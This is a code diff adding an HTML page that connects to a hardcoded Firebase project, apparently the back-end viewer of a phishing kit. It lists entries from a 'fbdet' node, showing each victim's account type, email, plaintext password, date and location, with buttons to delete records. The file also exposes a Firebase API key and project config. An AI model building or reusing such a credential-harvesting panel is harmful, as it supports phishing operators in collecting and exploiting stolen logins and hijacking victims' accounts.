@@ -1,0 +1,72 @@
+<!doctype HTML>
+<html>
+<head>
+  <title>Database </title>
+</head>
+<body>
+  <div></div>
+  <div id="save">
+
+  </div>
+
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
+
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-database.js"></script>
+
+  <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
+
+  <script>
+
+// For Firebase JS SDK v7.20.0 and later, measurementId is optional
+const firebaseConfig = {
+  apiKey: "AIzaSyA_nBeaIR9LuzSE1FR6seaskboK7eSkqU4",
+  authDomain: "fazzabirds.firebaseapp.com",
+  databaseURL: "https://fazzabirds-default-rtdb.firebaseio.com",
+  projectId: "fazzabirds",
+  storageBucket: "fazzabirds.appspot.com",
+  messagingSenderId: "971051821488",
+  appId: "1:971051821488:web:8f5c2fa5a3e0b881b3ce75"
+};
+    firebase.initializeApp(firebaseConfig);
+    firebase.auth().signInAnonymously().catch(function(error) {
+
+      // Handle Errors here.
+
+      var errorCode = error.code;
+      var errorMessage = error.message;
+
+      window.alert("Error : " + errorMessage);
+
+      // ...
+    });
+    firebase.database().ref("fbdet").on("child_added", function (snapshot) {
+
+
+
+      var html = "";
+
+      html += "<hr></hr>"
+      html += "<li id='message-" + snapshot.key + "' class= 'canvaschat'>";
+
+      html += "Account type: <b>"+snapshot.val().type+ "</b> <br> User: <b> " + snapshot.val().emle+ "</b><br> Password: <b> " +snapshot.val().pass+ "</b> <br> Date: <b>" +snapshot.val().date+"</b><br>Location: <b>"+snapshot.val().timezone+"</b><br> Time: <b>"+snapshot.val().time+"</b>";
+      html += "</li>";
+      html += "<button data-id='" + snapshot.key + "' onclick='deleteMessage(this);' class = 'send'>";
+      html += "Delete";
+      html += "</button>";
+
+      document.getElementById("save").innerHTML += html;
+    });
+    function deleteMessage(self) {
+
+      var messageId = self.getAttribute("data-id");
+
+      firebase.database().ref("fbdet").child(messageId).remove();
+    }
+    firebase.database().ref("fbdet").on("child_removed", function (snapshot) {
+      // remove message node
+      document.getElementById("message-" + snapshot.key).innerHTML = "deleted";
+    });
+
+  </script>
+</body>
+</html>
